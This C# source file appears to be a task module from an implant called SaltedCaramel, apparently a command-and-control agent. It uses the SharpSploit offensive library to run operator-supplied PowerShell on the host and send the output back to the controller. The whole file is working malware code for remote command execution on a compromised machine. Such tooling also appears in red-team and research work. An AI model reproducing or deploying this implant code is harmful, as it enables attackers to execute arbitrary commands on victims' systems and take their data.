using Newtonsoft.Json;
using SharpSploit.Execution;

namespace SaltedCaramel.Tasks
{
    class Powershell
    {
        internal static void Execute(SaltedCaramelTask task, SaltedCaramelImplant implant)
        {
            string args = task.@params;

            string result = Shell.PowerShellExecute(args);

            TaskResponse response = new TaskResponse(JsonConvert.SerializeObject(result), task.id);
            implant.PostResponse(response);
            implant.SendComplete(task.id);
        }
    }
}
